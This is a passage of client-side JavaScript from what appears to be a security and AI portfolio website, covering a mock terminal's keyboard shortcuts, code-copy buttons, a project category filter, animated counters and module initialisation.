          termInput.value = '';
        }
      } else if (e.key === 'Escape') {
        e.preventDefault();
        closeTerminal();
      }
    });

    // Toggle shortcut with backtick (`) or tilde (~)
    window.addEventListener('keydown', (e) => {
      if ((e.key === '`' || e.key === '~') && (document.activeElement !== termInput && document.activeElement.tagName !== 'INPUT' && document.activeElement.tagName !== 'TEXTAREA')) {
        e.preventDefault();
        termModal.classList.contains('hidden') ? openTerminal() : closeTerminal();
      } else if (e.key === 'Escape' && !termModal.classList.contains('hidden')) {
        closeTerminal();
      }
    });

    window.openTerminal = openTerminal;
    window.closeTerminal = closeTerminal;

    window.openTerminalWithCommand = function (cmd) {
      openTerminal();
      setTimeout(() => {
        handleCommand(cmd);
      }, 100);
    };

    // Document-level event delegation for terminal triggers
    document.addEventListener('click', (e) => {
      const termBtn = e.target.closest('[data-trigger-term]');
      if (termBtn) {
        e.preventDefault();
        openTerminal();
      }
    });
  }

  // =========================================================================
  // 8. 1-CLICK CODE COPY HELPER
  // =========================================================================
  function initCodeCopy() {
    const blocks = document.querySelectorAll('pre, .code-container');
    blocks.forEach((block) => {
      if (block.querySelector('.copy-code-btn')) return;

      block.style.position = 'relative';

      const btn = document.createElement('button');
      btn.className = 'copy-code-btn absolute top-2.5 right-2.5 inline-flex items-center gap-1 px-2.5 py-1 rounded bg-surface-raised/90 hover:bg-surface-raised border border-border-hairline hover:border-primary/50 text-[10px] font-mono text-outline hover:text-primary transition-all shadow-sm z-10';
      btn.innerHTML = `
        <span class="material-symbols-outlined text-[13px]">content_copy</span>
        <span class="copy-label">Copy</span>
      `;

      btn.addEventListener('click', async (e) => {
        e.stopPropagation();
        const codeElement = block.querySelector('code') || block;
        const textToCopy = codeElement.innerText.replace(/^\s*\d+:\s/gm, '');

        try {
          await navigator.clipboard.writeText(textToCopy);
          btn.innerHTML = `
            <span class="material-symbols-outlined text-[13px] text-primary">check</span>
            <span class="copy-label text-primary font-bold">Copied!</span>
          `;
          btn.classList.add('border-primary');
          showToast('Code snippet copied to clipboard', 'success');
          setTimeout(() => {
            btn.innerHTML = `
              <span class="material-symbols-outlined text-[13px]">content_copy</span>
              <span class="copy-label">Copy</span>
            `;
            btn.classList.remove('border-primary');
          }, 2000);
        } catch (err) {
          console.error('Failed to copy code: ', err);
        }
      });

      block.appendChild(btn);
    });
  }

  // =========================================================================
  // 9. INTERACTIVE PROJECT FILTER (ON INDEX.HTML)
  // =========================================================================
  function initProjectFilters() {
    const projectsSection = document.getElementById('projects');
    if (!projectsSection) return;

    if (document.getElementById('project-filter-bar')) return;

    const headingBlock = projectsSection.querySelector('h2')?.parentElement;
    if (!headingBlock) return;

    const filterBar = document.createElement('div');
    filterBar.id = 'project-filter-bar';
    filterBar.className = 'flex flex-wrap items-center gap-2 mb-8 font-mono text-xs';
    filterBar.innerHTML = `
      <span class="text-outline text-[11px] mr-1 hidden sm:inline">FILTER:</span>
      <button class="proj-filter-btn active px-3 py-1.5 rounded-lg border border-primary/50 bg-primary/10 text-primary font-bold transition-all" data-filter="all">
        All Projects (7)
      </button>
      <button class="proj-filter-btn px-3 py-1.5 rounded-lg border border-border-hairline bg-surface-subtle text-on-surface-variant hover:text-primary hover:border-primary/40 transition-all" data-filter="offensive">
        Offensive Security (3)
      </button>
      <button class="proj-filter-btn px-3 py-1.5 rounded-lg border border-border-hairline bg-surface-subtle text-on-surface-variant hover:text-secondary hover:border-secondary/40 transition-all" data-filter="ai">
        Local AI &amp; Agents (4)
      </button>
      <button class="proj-filter-btn px-3 py-1.5 rounded-lg border border-border-hairline bg-surface-subtle text-on-surface-variant hover:text-on-surface hover:border-border-highlight transition-all" data-filter="infra">
        Infrastructure &amp; Systems (3)
      </button>
    `;

    headingBlock.parentElement.insertBefore(filterBar, headingBlock.nextElementSibling);

    const cards = projectsSection.querySelectorAll('.bg-surface-subtle.rounded-xl, .bg-surface-subtle.rounded-2xl');
    cards.forEach(card => {
      const text = card.innerText.toLowerCase();
      let cats = ['all'];
      if (text.includes('sentinelai') || text.includes('pentesting') || text.includes('handbook')) cats.push('offensive');
      if (text.includes('agent') || text.includes('cyberai') || text.includes('opencode') || text.includes('ai application') || text.includes('local ai')) cats.push('ai');
      if (text.includes('compute stack') || text.includes('persistent memory') || text.includes('platform')) cats.push('infra');
      card.setAttribute('data-proj-cat', cats.join(' '));
    });

    const filterBtns = filterBar.querySelectorAll('.proj-filter-btn');
    filterBtns.forEach(btn => {
      btn.addEventListener('click', () => {
        const filter = btn.getAttribute('data-filter');

        filterBtns.forEach(b => {
          b.classList.remove('active', 'border-primary/50', 'bg-primary/10', 'text-primary', 'font-bold');
          b.classList.add('border-border-hairline', 'bg-surface-subtle', 'text-on-surface-variant');
        });
        btn.classList.add('active', 'border-primary/50', 'bg-primary/10', 'text-primary', 'font-bold');
        btn.classList.remove('border-border-hairline', 'bg-surface-subtle', 'text-on-surface-variant');

        cards.forEach(card => {
          const cats = card.getAttribute('data-proj-cat') || '';
          if (filter === 'all' || cats.includes(filter)) {
            card.style.display = '';
            card.style.opacity = '1';
          } else {
            card.style.display = 'none';
          }
        });
      });
    });
  }

  // =========================================================================
  // 10. ANIMATED NUMBER COUNTERS
  // =========================================================================
  function initCounters() {
    const counterElements = document.querySelectorAll('[data-counter]');
    if (!counterElements.length) return;

    const observer = new IntersectionObserver((entries) => {
      entries.forEach(entry => {
        if (entry.isIntersecting) {
          const el = entry.target;
          const target = parseInt(el.getAttribute('data-counter'), 10);
          const suffix = el.getAttribute('data-suffix') || '';
          const prefix = el.getAttribute('data-prefix') || '';
          let current = 0;
          const step = Math.max(1, Math.floor(target / 40));
          const interval = setInterval(() => {
            current += step;
            if (current >= target) {
              current = target;
              clearInterval(interval);
            }
            el.innerText = prefix + current + suffix;
          }, 25);
          observer.unobserve(el);
        }
      });
    }, { threshold: 0.2 });

    counterElements.forEach(el => observer.observe(el));
  }

  // =========================================================================
  // UTILITY HELPER
  // =========================================================================
  function escapeHtml(str) {
    if (!str) return '';
    return str.replace(/[&<>"']/g, m => ({
      '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
    })[m]);
  }

  // Initialize all interactive modules on DOM ready
  function initAll() {
    initProgressBar();
    initFloatingDock();
    initCommandPalette();
    initCyberTerminal();
    initCodeCopy();
    initProjectFilters();
    initCounters();
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initAll);
  } else {
    initAll();
  }

})();
